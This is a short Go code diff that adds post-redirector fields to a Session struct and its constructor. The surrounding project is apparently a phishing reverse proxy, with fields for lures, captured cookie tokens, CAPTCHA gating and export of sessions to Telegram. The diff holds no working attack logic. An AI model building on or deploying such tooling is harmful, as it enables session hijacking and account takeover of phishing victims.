@@ -22,14 +22,17 @@ type Session struct {
 	IsForwarded    bool
 	ProgressIndex  int
 	RedirectCount  int
-	PhishLure      *Lure
-	RedirectorName string
-	LureDirPath    string
-	DoneSignal     chan struct{}
-	RemoteAddr     string
-	UserAgent      string
-	TelegramExported bool // Track if session was already exported to Telegram
-	IsCaptchaVerified bool // Track if CAPTCHA was verified for this session
+	PhishLure            *Lure
+	RedirectorName       string
+	LureDirPath          string
+	PostRedirectorName   string
+	PostLureDirPath      string
+	PostRedirectorServed bool
+	DoneSignal           chan struct{}
+	RemoteAddr           string
+	UserAgent            string
+	TelegramExported     bool // Track if session was already exported to Telegram
+	IsCaptchaVerified    bool // Track if CAPTCHA was verified for this session
 }
 
 func NewSession(name string) (*Session, error) {
@@ -48,14 +51,17 @@ func NewSession(name string) (*Session, error) {
 		IsForwarded:    false,
 		ProgressIndex:  0,
 		RedirectCount:  0,
-		PhishLure:      nil,
-		RedirectorName: "",
-		LureDirPath:    "",
-		DoneSignal:     make(chan struct{}),
-		RemoteAddr:     "",
-		UserAgent:      "",
-		TelegramExported: false,
-		IsCaptchaVerified: false,
+		PhishLure:            nil,
+		RedirectorName:       "",
+		LureDirPath:          "",
+		PostRedirectorName:   "",
+		PostLureDirPath:      "",
+		PostRedirectorServed: false,
+		DoneSignal:           make(chan struct{}),
+		RemoteAddr:           "",
+		UserAgent:            "",
+		TelegramExported:     false,
+		IsCaptchaVerified:    false,
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
